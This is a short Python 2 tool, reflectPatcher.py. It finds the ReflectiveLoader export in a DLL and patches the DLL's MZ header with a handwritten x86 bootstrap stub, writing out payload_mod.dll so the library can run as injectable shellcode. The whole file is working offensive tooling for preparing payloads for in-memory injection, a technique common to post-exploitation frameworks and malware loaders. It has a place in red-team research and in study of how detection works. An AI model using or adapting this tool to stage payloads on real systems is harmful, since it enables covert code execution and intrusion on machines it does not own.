import sys, pefile, struct

__author__  = "Borja Merino Febrero"
__email__   = "bmerinofe@gmail.com"
__license__ = "GPL"
__version__ = "0.1"

class bcolors:
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    GREEN = '\033[32m'
    ENDC = '\033[0m'

def get_file_offset(pe):
  rva =''
  if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
    for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
      if "ReflectiveLoader" in export.name:
        rva = export.address
        print bcolors.GREEN + "[*] %s export Found! Ord:%s EntryPoint offset: %xh" % (export.name, export.ordinal, rva) + bcolors.ENDC
        break;

  if not rva:
    print bcolors.FAIL + "[!] Reflective export function not found :/" + bcolors.ENDC
    sys.exit(1)

  offset_va = rva - pe.get_section_by_rva(rva).VirtualAddress
  offset_file = offset_va + pe.get_section_by_rva(rva).PointerToRawData

  # Correct 7 bytes
  offset_file -= 7

  # Return little endian version
  return struct.pack("<I", offset_file).encode('hex')

def patch_stub(offset_file):
  stub = ("\x4D"                                    # dec ebp             ; M
          "\x5A"                                    # pop edx             ; Z
          "\xE8\x00\x00\x00\x00"                    # call 0              ; call nexmsn ls t instruction
          "\x5B"                                    # pop ebx             ; get our location (+7)
          "\x52"                                    # push edx            ; push edx back
          "\x45"                                    # inc ebp             ; restore ebp
          "\x55"                                    # push ebp            ; save ebp
          "\x89\xE5"                                # mov ebp, esp        ; setup fresh stack frame
          "\x81\xC3" + offset_file.decode('hex')  + # add ebx, 0x???????? ; add offset to ReflectiveLoader
          "\xFF\xD3"                                # call ebx            ; call ReflectiveLoader
          "\x31\xDB"                                # xor ebx,ebx         ; zeroed ebx
          "\xF7\xE3")                               # mul ebx             ; zeroed eax and edx
  return stub


def main(argv):

  if len(sys.argv) == 1:
    print bcolors.GREEN + "Usage: python reflectPatcher.py MyreflectiveDLL.dll" + bcolors.ENDC
    sys.exit(1)

  dll = sys.argv[1]

  try:
    pe =  pefile.PE(dll)
    print bcolors.GREEN + "[*] %s loaded" % dll + bcolors.ENDC
  except IOError as e:
    print str(e)
    sys.exit(1)

  offset_file = get_file_offset(pe)
  stub = patch_stub(offset_file)

  src = file(dll,'rb')
  payload = src.read()

  # Relfective = stub + (payload - stub)
  reflective_payload = stub + payload[len(stub):]
  #print bcolors.GREEN + "[*] NO Size (4 bytes) prefixed at the beginning of the payload!" + bcolors.ENDC

  patched_dll = 'payload_mod.dll'
  dst = open(patched_dll,'wb')
  dst.write(reflective_payload)

  src.close()
  dst.close()
  print bcolors.BOLD + "[+] Patched! %s (%d bytes)." % (patched_dll,len(reflective_payload)) + bcolors.ENDC

if __name__ == '__main__':
  main(sys.argv[1:])